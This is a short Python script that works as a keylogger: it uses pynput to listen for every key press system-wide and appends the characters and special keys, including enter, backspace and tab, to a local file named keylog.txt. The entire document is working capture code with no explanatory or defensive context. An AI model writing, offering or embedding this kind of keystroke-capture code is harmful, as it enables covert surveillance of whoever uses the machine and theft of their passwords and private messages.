from pynput import keyboard

IGNORE = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.cmd,
    keyboard.Key.caps_lock,
}

def on_press(key):
    if key in IGNORE:
        return
    try:
        #normal character keys
        with open("keylog.txt", "a", encoding="utf-8") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("keylog.txt", "a", encoding="utf-8") as log_file:
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.backspace:
                log_file.write("[BACKSPACE]")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.tab:
                log_file.write("\t")
            else:
                log_file.write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()          